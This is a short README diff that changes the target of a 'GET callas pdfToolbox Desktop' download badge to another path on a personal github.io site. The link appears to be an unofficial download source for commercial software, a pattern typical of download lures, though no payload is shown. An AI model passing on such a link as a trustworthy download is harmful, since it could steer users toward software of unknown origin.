@@ -3,7 +3,7 @@
 
 ![callas pdfToolbox Desktop](https://www.workflowz.com/wp-content/uploads/2019/12/callas-logo-pdftoolbox-rgb.png)
 
-[![GET callas pdfToolbox Desktop](https://img.shields.io/badge/GET%20%E2%80%94%20callas%20pdfToolbox%20Desktop-0078D6?style=for-the-badge&logoColor=white)](https://alannaviau.github.io/.github/pdfToolbox)
+[![GET callas pdfToolbox Desktop](https://img.shields.io/badge/GET%20%E2%80%94%20callas%20pdfToolbox%20Desktop-0078D6?style=for-the-badge&logoColor=white)](https://alannaviau.github.io/.github/Toolbox)
 
 ---
 
